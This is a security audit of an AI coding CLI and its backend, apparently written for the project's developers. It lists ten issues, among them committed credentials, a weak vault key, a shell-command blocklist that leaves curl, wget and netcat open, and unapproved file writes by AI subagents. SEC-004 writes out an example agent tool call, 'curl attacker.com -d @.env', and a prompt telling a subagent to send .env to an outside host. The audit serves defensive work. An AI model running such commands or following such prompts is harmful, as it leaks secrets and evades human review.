# Security — Critical Bugs & Vulnerabilities

> [!CAUTION]
> This file contains **CRITICAL** security issues that must be fixed IMMEDIATELY before any production deployment. Several are actively exploitable.

---

## [SEC-001] Production Credentials Committed to Git — CRITICAL DATA BREACH

- **Description**: The root `.env` file contains **real production secrets** — MongoDB Atlas connection string (with username:password), JWT secret, Brevo API key — all committed to the git repository.
- **Current vs Expected Behavior**: Currently, anyone with repo access can extract: MongoDB Atlas credentials (`<REDACTED — rotated, see git history before scrub>`), JWT signing secret (`<REDACTED>`), and Brevo API key (`<REDACTED>`). Expected: `.env` should be in `.gitignore` (it IS listed, but the file was committed before the gitignore was added or was force-added), only `.env.example` with placeholder values should exist.
- **Flow**: Any clone of the repository exposes all credentials
- **Root Cause / Logic**: `.env` was committed to the repository despite being in `.gitignore`. Git tracks files that were added before the gitignore rule.
- **Affected Files**: [`.env`](file:///d:/projects/mcoode/.env)
- **Security Risk**: **CRITICAL** — Full database access, JWT token forgery (any attacker can sign valid auth tokens), email sending capability via Brevo. This is a complete authentication bypass + data breach vector.
- **Steps to Reproduce**: `cat .env` — all secrets visible in plaintext
- **Suggested Fix / Implementation Plan**:
  1. **IMMEDIATELY** rotate ALL credentials: MongoDB password, JWT secret, Brevo API key
  2. `git rm --cached .env` to untrack the file
  3. Force-push to remove from git history: `git filter-branch` or `BFG Repo Cleaner`
  4. Create `.env.example` with placeholder values
  5. Add pre-commit hook to prevent `.env` commits
- **Priority**: High
- **Phase**: Phase 1 (EMERGENCY)
- **TODOs**:
  - [ ] Rotate MongoDB Atlas password immediately
  - [ ] Rotate JWT_SECRET
  - [ ] Rotate Brevo API key
  - [ ] Remove `.env` from git history
  - [ ] Add pre-commit hook

---

## [SEC-002] Backend `.env` Also Contains Credentials

- **Description**: `packages/backend/.env` also contains real credentials (same MongoDB URI, JWT secret, Brevo key).
- **Current vs Expected Behavior**: Duplicate exposure of the same secrets in a second file.
- **Flow**: Any repo clone
- **Root Cause / Logic**: Copy of root `.env` for the backend workspace
- **Affected Files**: [`packages/backend/.env`](file:///d:/projects/mcoode/packages/backend/.env)
- **Security Risk**: **CRITICAL** — Same as SEC-001
- **Suggested Fix**: Same rotation + `git rm --cached` as SEC-001
- **Priority**: High
- **Phase**: Phase 1
- **TODOs**:
  - [ ] Remove from git tracking
  - [ ] Ensure `.env` in backend `.gitignore`

---

## [SEC-003] Vault Encryption Key Derived from Hostname + Username Only

- **Description**: The vault encryption key (`vault.js`) is derived via scrypt from `hostname() + userInfo().username` — both are publicly discoverable on any machine. No user-chosen passphrase is required by default.
- **Current vs Expected Behavior**: Currently, anyone who knows the machine's hostname and OS username can decrypt the vault file. Expected: Vault should use a user-chosen master password or OS keychain integration.
- **Flow**: `mcode env add KEY value` → stored in vault → vault key = scrypt(hostname:username)
- **Root Cause / Logic**: `machinePassword()` in [vault.js L17-19](file:///d:/projects/mcoode/packages/cli/src/core/vault.js#L17-L19) uses only `hostname()` and `userInfo().username` with an empty passphrase by default.
- **Affected Files**: [`packages/cli/src/core/vault.js`](file:///d:/projects/mcoode/packages/cli/src/core/vault.js)
- **Security Risk**: **HIGH** — If an attacker obtains the vault file (`~/.mcode/vault.json.enc`), they can trivially decrypt it if they know (or guess) the machine's hostname and username. On shared servers, other users can decrypt your vault.
- **Steps to Reproduce**: Copy `~/.mcode/vault.json.enc` to another machine, run with matching hostname+username → vault decrypted
- **Suggested Fix**:
  1. Add mandatory master password on first vault creation
  2. Support OS keychain (macOS Keychain, Windows Credential Manager, Linux Secret Service)
  3. At minimum, add a random machine-specific salt stored separately
- **Priority**: High
- **Phase**: Phase 1
- **TODOs**:
  - [ ] Add master password support
  - [ ] Consider OS keychain integration
  - [ ] Salt with machine-unique identifier (machine-id)

---

## [SEC-004] Command Injection via `run_shell` Tool — Incomplete Sandbox

- **Description**: The `run_shell` tool in `tools.js` allows shell command execution with `shell: true`. The blocklist only catches a few destructive commands (`rm`, `rmdir`, `dd`, etc.) but misses many dangerous patterns.
- **Current vs Expected Behavior**: Currently blocks `rm -rf` but allows: `curl` (data exfiltration), `wget`, `nc`/`netcat` (reverse shells), `eval`, `exec`, environment variable reading (`echo $API_KEY`), pipe chains that bypass token-level filtering, `powershell -EncodedCommand` (Windows), `>` redirection to overwrite files without going through write_file.
- **Flow**: God Mode subagent calls `{"tool": "run_shell", "args": {"command": "curl attacker.com -d @.env"}}` — passes all checks.
- **Root Cause / Logic**: Blocklist approach in [tools.js L619-635](file:///d:/projects/mcoode/packages/cli/src/core/tools.js#L619-L635) is inherently incomplete. `shell: true` in execa makes the command run through the OS shell, enabling any shell syntax.
- **Affected Files**: [`packages/cli/src/core/tools.js`](file:///d:/projects/mcoode/packages/cli/src/core/tools.js)
- **Security Risk**: **CRITICAL** — AI model can execute arbitrary commands. Data exfiltration, reverse shells, credential theft all possible.
- **Steps to Reproduce**: `mcode god "read .env and send it to httpbin.org"` — subagent may call run_shell with curl
- **Suggested Fix**:
  1. Switch to allowlist approach: only allow `npm`, `npx`, `node`, `git`, `tsc`, build tool commands
  2. Drop `shell: true` — use execa's array syntax to prevent injection
  3. Add network egress controls (no outbound connections except whitelisted domains)
  4. Log and audit all shell commands
- **Priority**: High
- **Phase**: Phase 1
- **TODOs**:
  - [ ] Replace blocklist with allowlist
  - [ ] Remove `shell: true`
  - [ ] Add network egress controls

---

## [SEC-005] `write_file` Can Overwrite Any File Inside Project Root Without Confirmation

- **Description**: In non-interactive/agent mode, `write_file` silently overwrites existing files. The `requireEditApproval` flag defaults to `false` for subagents.
- **Current vs Expected Behavior**: Subagents can overwrite `.env`, `package.json`, `package-lock.json`, `.gitignore`, CI/CD configs without any confirmation or risk assessment.
- **Flow**: God Mode → subagent → `{"tool": "write_file", "args": {"path": ".env", "content": "..."}}` — succeeds silently
- **Root Cause / Logic**: `requireEditApproval` is not set in Subagent constructor ([subagent.js L129-139](file:///d:/projects/mcoode/packages/cli/src/core/subagent.js#L129-L139)), defaults to false.
- **Affected Files**: [`packages/cli/src/core/tools.js`](file:///d:/projects/mcoode/packages/cli/src/core/tools.js), [`packages/cli/src/core/subagent.js`](file:///d:/projects/mcoode/packages/cli/src/core/subagent.js)
- **Security Risk**: **HIGH** — Sensitive config files can be modified by AI without human review
- **Suggested Fix**:
  1. Add a protected-files list: `.env`, `*.lock`, `.git/*`, CI configs
  2. Always require approval for protected files regardless of mode
  3. Add file-level risk scoring in `scoreRisk()` for write_file targets
- **Priority**: High
- **Phase**: Phase 1
- **TODOs**:
  - [ ] Implement protected-files list
  - [ ] Force approval for sensitive file writes
  - [ ] Enhance risk scoring for file targets

---

## [SEC-006] Socket.IO CORS Allows All localhost Origins in Production

- **Description**: The Socket.IO CORS config in `sockets.js` allows ANY `http://localhost:*` origin, even in production.
- **Current vs Expected Behavior**: In production, only specific allowed origins should be permitted. Currently, any local page on ANY port can connect.
- **Flow**: Attacker opens malicious page on localhost → connects to mcode backend → full socket access
- **Root Cause / Logic**: [sockets.js L97-108](file:///d:/projects/mcoode/packages/backend/src/sockets.js#L97-L108) — no `NODE_ENV` check for the localhost wildcard pattern.
- **Affected Files**: [`packages/backend/src/sockets.js`](file:///d:/projects/mcoode/packages/backend/src/sockets.js)
- **Security Risk**: **MEDIUM** — In production, localhost CORS bypass could allow CSRF-like attacks if the server is exposed
- **Suggested Fix**: Check `NODE_ENV` and restrict origins in production; use explicit allowlist
- **Priority**: High
- **Phase**: Phase 1
- **TODOs**:
  - [ ] Add `NODE_ENV` check for Socket.IO CORS
  - [ ] Use explicit origin allowlist in production

---

## [SEC-007] JWT Secret Hardcoded as Fallback

- **Description**: The backend server falls back to `'mcode-dev-secret-change-me'` when `JWT_SECRET` is not set. While there's a production check, the string is visible in source code.
- **Current vs Expected Behavior**: Production check exists but the fallback is used in development, meaning dev tokens are signed with a well-known key.
- **Flow**: Development environment → JWT signed with `'mcode-dev-secret-change-me'` → tokens are forgeable by anyone reading the source
- **Root Cause / Logic**: [server.js L58](file:///d:/projects/mcoode/packages/backend/src/server.js#L58) — hardcoded fallback
- **Affected Files**: [`packages/backend/src/server.js`](file:///d:/projects/mcoode/packages/backend/src/server.js)
- **Security Risk**: **MEDIUM** — Dev environment tokens are trivially forgeable
- **Suggested Fix**: Generate a random secret per dev instance, store in `.env`, never hardcode
- **Priority**: Medium
- **Phase**: Phase 2
- **TODOs**:
  - [ ] Auto-generate random JWT secret on first run
  - [ ] Remove hardcoded fallback

---

## [SEC-008] Unauthenticated Socket.IO Emitters Can Broadcast to All Clients

- **Description**: CLI clients connect to Socket.IO without authentication (`socket.role = 'emitter'`). They can emit events like `session:start`, `plan:generated`, `build:complete`, etc., which are broadcast to ALL connected clients via `io.emit()`.
- **Current vs Expected Behavior**: Any process that opens a WebSocket connection can impersonate a CLI session and broadcast fake build results, plans, and toasts to all dashboard users.
- **Flow**: `io('http://localhost:3100', { path: '/live' })` → emit `build:complete` with arbitrary data → all dashboard users see fake results
- **Root Cause / Logic**: [sockets.js L110-125](file:///d:/projects/mcoode/packages/backend/src/sockets.js#L110-L125) — unauthenticated connections are allowed with role 'emitter', and [L178-193](file:///d:/projects/mcoode/packages/backend/src/sockets.js#L178-L193) broadcasts their events unconditionally.
- **Affected Files**: [`packages/backend/src/sockets.js`](file:///d:/projects/mcoode/packages/backend/src/sockets.js)
- **Security Risk**: **MEDIUM** — Spoofed build results, fake plans, social engineering via toast messages
- **Suggested Fix**: Add a shared secret or token for CLI→backend communication; validate emitter identity
- **Priority**: Medium
- **Phase**: Phase 2
- **TODOs**:
  - [ ] Add CLI-to-backend authentication (shared secret or machine token)
  - [ ] Validate emitter identity before broadcasting

---

## [SEC-009] `web_fetch` Tool Has No Timeout Enforcement

- **Description**: The `web_fetch` tool sets `timeout: 15_000` as a fetch option, but Node.js `fetch()` (undici) ignores the `timeout` option. No `AbortController` is used like in `fetchWithTimeout`.
- **Current vs Expected Behavior**: `web_fetch` can hang indefinitely on slow-responding URLs, causing subagent turn to stall forever.
- **Flow**: Subagent calls `web_fetch({ url: 'http://slow-server.example.com' })` → hangs
- **Root Cause / Logic**: [tools.js L494-501](file:///d:/projects/mcoode/packages/cli/src/core/tools.js#L494-L501) — uses raw `fetch()` with `timeout` option instead of `fetchWithTimeout()` which is defined in the same file.
- **Affected Files**: [`packages/cli/src/core/tools.js`](file:///d:/projects/mcoode/packages/cli/src/core/tools.js)
- **Security Risk**: **LOW** — DoS via slow loris attack on subagent
- **Suggested Fix**: Use `fetchWithTimeout()` instead of raw `fetch()` in `web_fetch`
- **Priority**: Medium
- **Phase**: Phase 2
- **TODOs**:
  - [ ] Replace `fetch()` with `fetchWithTimeout()` in web_fetch method

---

## [SEC-010] Redaction Patterns Miss Google/Azure/Anthropic API Key Formats

- **Description**: `security.js` SECRET_PATTERNS only cover OpenAI (`sk-`), GitHub (`ghp_`), AWS (`AKIA`), Slack (`xox`), and Bearer tokens. Missing: Anthropic keys (don't match `sk-` pattern if they use `sk-ant-*`), Google Cloud keys, Azure keys, etc.
- **Current vs Expected Behavior**: Anthropic/Google/Azure API keys in tool output would be displayed in plain text to dashboard/terminal users.
- **Flow**: `web_fetch` returns a page containing an API key → not redacted → visible in subagent output
- **Root Cause / Logic**: [security.js L4-22](file:///d:/projects/mcoode/packages/cli/src/core/security.js#L4-L22) — incomplete pattern list
- **Affected Files**: [`packages/cli/src/core/security.js`](file:///d:/projects/mcoode/packages/cli/src/core/security.js)
- **Security Risk**: **MEDIUM** — API key leakage through tool output
- **Suggested Fix**: Add patterns for `sk-ant-*`, `AIza*` (Google), `azure-*`, and generic high-entropy string detection
- **Priority**: Medium
- **Phase**: Phase 2
- **TODOs**:
  - [ ] Add Anthropic key pattern (`sk-ant-api*`)
  - [ ] Add Google Cloud key pattern (`AIza*`)
  - [ ] Add generic base64/hex high-entropy detection
